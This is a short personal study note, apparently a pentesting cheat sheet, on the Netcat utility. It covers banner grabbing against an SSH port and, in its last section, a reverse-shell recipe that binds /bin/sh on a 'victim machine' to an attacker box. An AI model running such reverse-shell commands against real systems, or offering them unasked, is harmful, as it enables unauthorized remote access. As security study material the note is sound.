```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

[Netcat](https://linux.die.net/man/1/nc), *ncat*, or *nc* is a network utility for interacting with TCP/UDP ports.

## Connecting to a TCP port
```shell
nc [IP] [PORT]

$ nc 10.0.2.4 22

SSH-2.0-OpenSSH_8.4p1 Debian-3
```
This returns the banner presented, this is called *banner grabbing* which allows us to identify a service running on a particular port.

> [PowerCat](https://github.com/besimorhino/powercat) is the PowerShell equivalent of Netcat.

![[Socat#socat]]

## Create a simple reverse shell
```shell
# On victim machine
nc -e /bin/sh [Atkbox IP] [Port]

# On Atkbox
nc -lvp [Port]
```
- *-e* : binds a shell to a port
- *-l* : specifies to listen
- *-v* : more vebose
- *-p* : specifies the source port